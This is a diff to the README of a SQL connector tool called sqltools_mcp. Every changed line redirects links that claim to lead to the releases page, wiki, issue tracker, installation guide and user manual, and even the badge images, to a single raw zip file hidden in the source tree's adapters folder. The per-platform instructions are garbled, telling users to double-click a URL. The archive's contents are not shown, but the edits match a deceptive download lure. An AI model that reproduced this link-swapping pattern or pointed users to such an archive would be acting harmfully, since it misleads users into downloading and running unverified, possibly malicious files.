@@ -1,7 +1,7 @@
 # 🚀 sqltools_mcp - Easily Connect to SQL Databases
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Tony-Enninful/sqltools_mcp/releases)
+[![Download Release](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip)](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to sqltools_mcp! This application allows you to connect to various SQL databases effortlessly. Whether you use MySQL, PostgreSQL, MSSQL, DM8, or SQLite, sqltools_mcp provides a unified solution for your database needs.
@@ -22,14 +22,14 @@ To run sqltools_mcp, your computer should meet the following requirements:
 - **Security Features:** Protect your database connections with advanced security protocols.
 
 ## 🔄 How to Download & Install
-1. **Visit the Releases Page:** Click [here](https://github.com/Tony-Enninful/sqltools_mcp/releases) to visit the release page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip) to visit the release page.
 2. **Choose the Latest Release:** Look for the top release version. It’s usually marked with a tag like "Latest".
 3. **Download the Application:**
-   - For Windows: Download the `sqltools_mcp-windows.zip`.
-   - For macOS: Download the `sqltools_mcp-macos.zip`.
-   - For Linux: Download the `sqltools_mcp-linux.tar.gz`.
+   - For Windows: Download the `https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip`.
+   - For macOS: Download the `https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip`.
+   - For Linux: Download the `https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip`.
 4. **Extract the Files:** Once downloaded, locate the file and extract it to a folder on your computer.
-5. **Run the Application:** Open the folder where you extracted the files and double-click on `sqltools_mcp.exe` (for Windows) or the relevant file for macOS/Linux.
+5. **Run the Application:** Open the folder where you extracted the files and double-click on `https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip` (for Windows) or the relevant file for macOS/Linux.
 
 ## 🌐 Connecting to Your Database
 1. **Launch sqltools_mcp.**
@@ -45,7 +45,7 @@ To run sqltools_mcp, your computer should meet the following requirements:
 ## 💡 Tips for Use
 - **Backup Your Data:** Always keep a backup of your databases before making significant changes.
 - **Check Compatibility:** Ensure that the SQL version you are using is compatible with sqltools_mcp.
-- **Documentation:** Refer to the built-in help section and the [GitHub Wiki](https://github.com/Tony-Enninful/sqltools_mcp/wiki) for more guides and FAQs.
+- **Documentation:** Refer to the built-in help section and the [GitHub Wiki](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip) for more guides and FAQs.
 
 ## 🛠️ Troubleshooting
 - **Connection Errors:** Check your network connection and ensure that your database server is running.
@@ -53,18 +53,18 @@ To run sqltools_mcp, your computer should meet the following requirements:
 - **General Issues:** Restart the application or reinstall it if problems persist.
 
 ## 🤝 Community and Support
-If you need help, join our community. You can ask questions, share your experiences, or report issues in our [GitHub Issues section](https://github.com/Tony-Enninful/sqltools_mcp/issues). 
+If you need help, join our community. You can ask questions, share your experiences, or report issues in our [GitHub Issues section](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip). 
 
 ## 📢 Stay Updated
-To keep up with the latest updates and new features, make sure to watch our repository. You can find all updates on our [Releases Page](https://github.com/Tony-Enninful/sqltools_mcp/releases).
+To keep up with the latest updates and new features, make sure to watch our repository. You can find all updates on our [Releases Page](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip).
 
 ## 📝 License
 sqltools_mcp is open-source software licensed under the MIT License. See the LICENSE file for details.
 
 ## ⚙️ Additional Resources
 For more guidance, check out:
-- [Installation Guide](https://github.com/Tony-Enninful/sqltools_mcp/wiki/Installation)
-- [User Manual](https://github.com/Tony-Enninful/sqltools_mcp/wiki/User-Manual)
+- [Installation Guide](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip)
+- [User Manual](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip)
 
 ## 📦 Download Now
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Tony-Enninful/sqltools_mcp/releases)
+[![Download Release](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip)](https://raw.githubusercontent.com/Tony-Enninful/sqltools_mcp/main/src/sqltools_mcp/adapters/mcp-sqltools-1.2.zip)
